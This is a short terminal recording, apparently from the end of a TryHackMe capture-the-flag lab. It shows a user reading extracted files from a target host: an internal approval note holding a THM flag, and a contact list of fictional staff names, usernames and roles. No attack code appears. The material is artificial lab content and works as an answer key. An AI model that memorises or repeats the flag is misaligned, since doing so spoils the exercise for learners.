+[7mcat /tmp/cache_out/release/contacts.csv[27m[A[Acat /tmp/cache_out/release/approval.txt
+echo ----
+cat /tmp/cache_out/release/contacts.csv
+[?2004lINTERNAL - DOCUMENT CONTROL
+Prepared by Michelle Smith
+Reviewer: Sophia Reyes
+Approval reference: THM{2b3cc75adab999202e1879af542b2c11}
+Do not distribute externally.
+----
+name,username,role
+Sophia Reyes,s.reyes,Reviewer
+Michelle Smith,m.smith,Communications
+Luke Sullivan,l.sullivan,IT
+[?2004h(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ exit
+[?2004llogout
+Connection to day.o.thm closed.
+
+Script done on 2026-10-23 02:26:48+03:00 [COMMAND_EXIT_CODE="0"]
